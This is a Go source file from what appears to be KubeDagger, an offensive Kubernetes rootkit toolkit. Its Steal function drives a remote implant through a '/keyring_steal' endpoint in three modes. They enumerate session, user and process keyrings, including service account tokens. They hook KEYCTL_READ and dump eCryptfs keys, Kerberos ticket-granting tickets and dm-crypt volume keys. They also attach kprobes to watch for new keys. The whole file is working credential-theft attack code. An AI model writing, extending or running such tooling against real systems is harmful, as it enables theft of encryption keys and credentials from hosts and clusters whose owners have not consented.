package keyring

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type KeyringResult struct {
	Mode    string              `json:"mode"`
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Steal(target, mode, keyType, output string) error {
	var result *KeyringResult

	switch mode {
	case "list":
		result = listKeys(target, keyType)
	case "dump":
		result = dumpKeys(target, keyType)
	case "monitor":
		result = monitorKeys(target, keyType)
	default:
		return fmt.Errorf("unsupported mode: %s (use list, dump, or monitor)", mode)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func listKeys(target, keyType string) *KeyringResult {
	result := &KeyringResult{Mode: "list"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"enumerate_session_keyring",
			"enumerate keys in the current session keyring via keyctl kprobe",
			"keyring_enum_session",
		},
		{
			"enumerate_user_keyring",
			"enumerate keys in the user keyring including service account tokens",
			"keyring_enum_user",
		},
		{
			"enumerate_process_keyring",
			"enumerate keys in per-process keyrings for targeted extraction",
			"keyring_enum_process",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + keyType
		status := shared.SendCommand(target, "/keyring_steal", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}

func dumpKeys(target, keyType string) *KeyringResult {
	result := &KeyringResult{Mode: "dump"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"intercept_keyctl_read",
			"hook KEYCTL_READ syscall to capture key material as it's accessed",
			"keyring_intercept_read",
		},
		{
			"dump_ecryptfs_keys",
			"extract eCryptfs filesystem encryption keys from kernel keyring",
			"keyring_dump_ecryptfs",
		},
		{
			"dump_kerberos_tickets",
			"extract Kerberos ticket-granting tickets from keyring storage",
			"keyring_dump_kerberos",
		},
		{
			"dump_dm_crypt_keys",
			"extract dm-crypt volume encryption keys from kernel memory",
			"keyring_dump_dmcrypt",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + keyType
		status := shared.SendCommand(target, "/keyring_steal", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}

func monitorKeys(target, keyType string) *KeyringResult {
	result := &KeyringResult{Mode: "monitor"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"monitor_key_creation",
			"attach kprobe to key_create_or_update for real-time key interception",
			"keyring_monitor_create",
		},
		{
			"monitor_key_access",
			"trace keyctl syscalls to detect key read/update patterns",
			"keyring_monitor_access",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + keyType
		status := shared.SendCommand(target, "/keyring_steal", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}
